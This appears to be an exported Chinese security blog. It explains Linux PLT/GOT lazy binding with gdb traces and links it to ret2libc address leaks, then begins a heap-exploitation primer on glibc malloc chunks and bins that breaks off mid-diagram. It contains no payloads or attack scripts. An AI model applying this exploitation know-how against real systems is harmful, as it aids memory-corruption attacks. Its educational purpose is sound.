动态链接与延迟绑定机制\"></a>Linux 动态链接与延迟绑定机制</h2><p>​    假设，写了一个函数<code>f()</code>，调用了glibc中函数<code>x()</code>，在可执行文件是如何编译的？</p>\n<p>​    对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数<code>f()</code>的汇编指令中直接call函数<code>x()</code>的真实地址</p>\n<p>​    因此，需要在调用前加入一个寻找函数地址的过程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br> \t 1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // 存储实际的f()地址<br></code></pre></td></tr></table></figure>\n\n<p>​    如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它</p>\n<p>​    linux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)</p>\n<p>​    后文会具体分析其机制</p>\n<h5 id=\"实验参考\"><a href=\"#实验参考\" class=\"headerlink\" title=\"实验参考\"></a>实验参考</h5><p><a href=\"https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL\">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click\">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p>\n<h5 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">print_banner</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Welcome to World of PLT and GOT\\n&quot;</span>);<br>&#125;<br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"编译链接\"><a href=\"#编译链接\" class=\"headerlink\" title=\"编译链接\"></a>编译链接</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p>\n<p><strong>平台</strong>： <strong>kali</strong>-<strong>linux</strong></p>\n<p>开始调试</p>\n<p><strong>首先，在printf函数调用前下一个断点</strong></p>\n<p><img src=\"/img/plt&got/1.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    rbp<br></code></pre></td></tr></table></figure>\n\n<p>跳转到了0x555555555030这个地址，gdb对其的标注为&lt;puts@plt&gt;</p>\n<p>查看一下这个地址上的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure>\n\n<p>这里第一条指令，jmp 0x555555558000，gdb对其的标注为&lt;puts@got[plt]&gt;，查看这个地址上的值，会发现这个指令在原地跳转：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //这个地址就是上面plt表的第二条指令<br></code></pre></td></tr></table></figure>\n\n<p>相当于什么也没做</p>\n<p>那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，<code>jmp 0x555555555020</code>来完成的，这里先不对这个函数进行分析，直接来看结果</p>\n<p><strong>在printf函数后面下断点，重新查看刚才&lt;puts@got[plt]&gt;上的内容</strong></p>\n<p><img src=\"/img/plt&got/2.jpg\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure>\n\n<p>发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure>\n\n<p><strong>因此可以得出结论</strong></p>\n<p>​    plt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上</p>\n<p>​    这样就是为什么ret2libc需要使用用已被调用过的函数</p>\n<p><em>tips：</em></p>\n<p><em>linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)</em></p>\n<p><strong>然后解决如何寻找函数地址的问题</strong>：</p>\n<p>​    在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：</p>\n<p><img src=\"/img/plt&got/3.jpg\"></p>\n<p>​    这个push的值唯一标识了寻找的函数，</p>\n<p>​    然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure>\n\n<p>如果在gdb未开始调试的时候，查看这个jmp的值，是0x0</p>\n<p>而在printf函数前的断点查看，会发现它发生了变化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure>\n\n<p>这个函数为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，此处不在对其具体分析，其用处即为寻找编号为<code>reloc_index</code>的函数</p>\n<h5 id=\"整体流程\"><a href=\"#整体流程\" class=\"headerlink\" title=\"整体流程\"></a>整体流程</h5><p><strong>第一次调用</strong></p>\n<p><img src=\"/img/plt&got/4.jpg\"></p>\n<p><strong>第二次调用</strong></p>\n<p><img src=\"/img/plt&got/5.jpg\"></p>\n","site":{"data":{}},"more":"<p>Linux 动态链接与延迟绑定机制</p>\n<p><strong>Q：</strong></p>\n<ol>\n<li>为什么ret2libc泄露基址时要选择已经使用过的函数？</li>\n<li>何为延迟绑定？</li>\n</ol>\n<h2 id=\"Linux-动态链接与延迟绑定机制\"><a href=\"#Linux-动态链接与延迟绑定机制\" class=\"headerlink\" title=\"Linux 动态链接与延迟绑定机制\"></a>Linux 动态链接与延迟绑定机制</h2><p>​    假设，写了一个函数<code>f()</code>，调用了glibc中函数<code>x()</code>，在可执行文件是如何编译的？</p>\n<p>​    对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数<code>f()</code>的汇编指令中直接call函数<code>x()</code>的真实地址</p>\n<p>​    因此，需要在调用前加入一个寻找函数地址的过程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br> \t 1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // 存储实际的f()地址<br></code></pre></td></tr></table></figure>\n\n<p>​    如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它</p>\n<p>​    linux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)</p>\n<p>​    后文会具体分析其机制</p>\n<h5 id=\"实验参考\"><a href=\"#实验参考\" class=\"headerlink\" title=\"实验参考\"></a>实验参考</h5><p><a href=\"https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL\">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click\">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p>\n<h5 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">print_banner</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Welcome to World of PLT and GOT\\n&quot;</span>);<br>&#125;<br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"编译链接\"><a href=\"#编译链接\" class=\"headerlink\" title=\"编译链接\"></a>编译链接</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p>\n<p><strong>平台</strong>： <strong>kali</strong>-<strong>linux</strong></p>\n<p>开始调试</p>\n<p><strong>首先，在printf函数调用前下一个断点</strong></p>\n<p><img src=\"/img/plt&got/1.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    rbp<br></code></pre></td></tr></table></figure>\n\n<p>跳转到了0x555555555030这个地址，gdb对其的标注为&lt;puts@plt&gt;</p>\n<p>查看一下这个地址上的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure>\n\n<p>这里第一条指令，jmp 0x555555558000，gdb对其的标注为&lt;puts@got[plt]&gt;，查看这个地址上的值，会发现这个指令在原地跳转：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //这个地址就是上面plt表的第二条指令<br></code></pre></td></tr></table></figure>\n\n<p>相当于什么也没做</p>\n<p>那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，<code>jmp 0x555555555020</code>来完成的，这里先不对这个函数进行分析，直接来看结果</p>\n<p><strong>在printf函数后面下断点，重新查看刚才&lt;puts@got[plt]&gt;上的内容</strong></p>\n<p><img src=\"/img/plt&got/2.jpg\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure>\n\n<p>发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure>\n\n<p><strong>因此可以得出结论</strong></p>\n<p>​    plt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上</p>\n<p>​    这样就是为什么ret2libc需要使用用已被调用过的函数</p>\n<p><em>tips：</em></p>\n<p><em>linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)</em></p>\n<p><strong>然后解决如何寻找函数地址的问题</strong>：</p>\n<p>​    在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：</p>\n<p><img src=\"/img/plt&got/3.jpg\"></p>\n<p>​    这个push的值唯一标识了寻找的函数，</p>\n<p>​    然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure>\n\n<p>如果在gdb未开始调试的时候，查看这个jmp的值，是0x0</p>\n<p>而在printf函数前的断点查看，会发现它发生了变化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure>\n\n<p>这个函数为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，此处不在对其具体分析，其用处即为寻找编号为<code>reloc_index</code>的函数</p>\n<h5 id=\"整体流程\"><a href=\"#整体流程\" class=\"headerlink\" title=\"整体流程\"></a>整体流程</h5><p><strong>第一次调用</strong></p>\n<p><img src=\"/img/plt&got/4.jpg\"></p>\n<p><strong>第二次调用</strong></p>\n<p><img src=\"/img/plt&got/5.jpg\"></p>\n"},{"title":"Heap Exploitation","date":"2022-11-18T04:19:00.000Z","excerpt":"basic knowledge in heap exploitation","_content":"\n### malloc\n\n```c++\n#include <stdlib.h>\nvoid *malloc(size_t size);\n```\n\nsize = 0时，返回系统允许的最小内存块\n\n32位系统下malloc(0)分配8Bytes，64位分配16Bytes\n\n\n\n### brk\n\n堆段的起点和终点标识符：start_brk、brk（program brk)\n\n不开ASLR，初始时都指向bss段末尾（end_data)\n\n开启ASLR，会随机向后偏移一段距离\n\n`brk()`函数作用为抬高brk指针，获取一段heap\n\n程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  **main_arena**，后面malloc都会从main_arena中申请内存\n\n\n\n\n\n### chunk\n\n```C\nstruct malloc chunk{\n    INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).*/\n    INTERNAL_SIZE_T mchunk_size;      /* Size in bytes，including overhead.*/\n    struct malloc chunk* fd;          /* double links -- used only if free.*/\n    struct malloc chunk* bk;          /* Only used for large blocks: pointer to next larger size. */\n    struct malloc_chunk* fd_nextsize; /* double links -- used only if free.*/\n    struct malloc chunk* bk_nextsize;\n}\ntypedef struct malloc_chunk* mchunkptr;\n```\n\n\n\n#### allocated chunk\n\n`prevsize `：如果前一个chunk是free的***（这里指的是内存中的前一个，而不是freelist中的前一个）***，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节\n\n`size`：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的\n\n`userdata`：数据\n\n（下一个chunk的prevsize也会存储userdata）\n\n```C\n#define request2size(req) ...   //可以计算申请字节需要实际分配多少字节\n```\n\nchunk是在prevsize开始，但是malloc返回的指针指向userdata\n\n\n\n#### free chunk \n\n`prevsize`：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）\n\n`size`：同上\n\n`fd bk`：（在freelist中的）前一个/后一个chunk\n\n\n\n#### top chunk\n\n位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割\n\ntop chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆\n\n\n\n### Bin\n\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-17T04:09:19.532Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;ojfzveORWWdzC3RN6ooc\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;FyZdLwTWtfESSsWo7Yml\\&quot; name=\\&quot;第 1 